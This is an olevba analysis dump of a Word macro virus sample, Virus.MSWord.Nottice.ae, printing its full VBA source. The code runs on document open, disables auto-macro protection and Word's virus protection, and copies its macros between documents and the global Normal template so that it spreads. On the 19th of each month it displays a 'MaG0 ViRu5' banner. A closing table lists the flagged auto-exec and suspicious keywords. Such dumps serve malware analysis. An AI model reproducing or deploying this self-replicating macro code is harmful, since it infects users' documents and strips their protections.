olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nottice.ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nottice.ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Nottice.ae - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim J$
On Error GoTo -1: On Error GoTo Huayco
WordBasic.DisableAutoMacros 0
J$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If J$ = "normal.dot" Then
    If Mur = 1 Then
        GoTo Huayco
    Else
        WichaDOC
    End If
Else
    If Siwa = 1 Then
        GoTo Huayco
    Else
        WichaGlobal
    End If
End If
Huayco:
WordBasic.Call "MAGIA"
End Sub

Private Function Mur()
Dim i
Mur = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
                If WordBasic.[MacroName$](i, 1) = "MAGIA" Then
                             Mur = 1
        End If
    Next i
End If
End Function

Private Function Siwa()
Dim i
Siwa = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
                If WordBasic.[MacroName$](i, 0) = "MAGIA" Then
                             Siwa = 1
        End If
    Next i
End If
End Function

Private Sub WichaDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:MAGIA", WordBasic.[FileName$]() + ":MAGIA"
WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro"
WordBasic.MacroCopy "Global:ViewVBCode", WordBasic.[FileName$]() + ":ViewVBCode"
WordBasic.FileSaveAll 1, 1
End Sub

Private Sub WichaGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":MAGIA", "Global:MAGIA"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":ToolsMacro", "Global:ToolsMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":ViewVBCode", "Global:ViewVBCode"
WordBasic.FileSaveAll 1, 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO MAGIA.bas 
in file: ./Virus.MSWord.Nottice.ae - OLE stream: 'Macros/VBA/MAGIA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'any change will kill your system
'wicha wicha wicha
Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.MAGIA.MAIN"
If WordBasic.Day(WordBasic.Now()) = 19 Then
    WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Imprint MT Shadow"
    WordBasic.FontSize 30
    WordBasic.Bold
    WordBasic.FormatFont Color:=10
    WordBasic.Insert "¡MaG0 ViRu5!              "
    WordBasic.FormatFont Color:=1
    WordBasic.FontSize 18
    WordBasic.Insert "         <Chac1acay0 -- PeRU>"
End If
With Options
.VirusProtection = False
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: ./Virus.MSWord.Nottice.ae - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.HerramMacr.MAIN"
'wicha wicha wicha
End Sub
-------------------------------------------------------------------------------
VBA MACRO ViewVBCode.bas 
in file: ./Virus.MSWord.Nottice.ae - OLE stream: 'Macros/VBA/ViewVBCode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VerCódigovb.MAIN"
'wicha wicha wicha
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

